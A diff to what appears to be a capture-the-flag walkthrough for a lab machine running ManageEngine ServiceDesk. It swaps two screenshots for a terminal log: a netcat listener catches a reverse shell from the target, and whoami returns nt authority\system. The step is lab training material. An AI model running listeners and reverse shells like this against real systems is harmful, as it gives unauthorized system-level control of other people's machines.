@@ -131,8 +131,20 @@ Trying http://192.168.95.43:8080/VwanfQb2A2o4h7YlCTvOx7esmsYFS4hg/lhivbcumw/9oxp
 
 And back on the listner we get a shell 
 
-![image](https://user-images.githubusercontent.com/87468669/209433565-30966d1d-a150-4859-872b-4f06aee74908.png)
-![image](https://user-images.githubusercontent.com/87468669/209433654-5c03ac27-0a2c-4ba6-a05c-de2ecd21f8c4.png)
+```
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Helpdesk]
+└─$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [192.168.49.59] from (UNKNOWN) [192.168.59.43] 49191
+Microsoft Windows [Version 6.0.6001]
+Copyright (c) 2006 Microsoft Corporation. All rights reserved.
+
+C:\ManageEngine\ServiceDesk\bin> whoami
+whoami
+nt authority\system
+
+C:\ManageEngine\ServiceDesk\bin> 
+```
 
 
 And we're done 
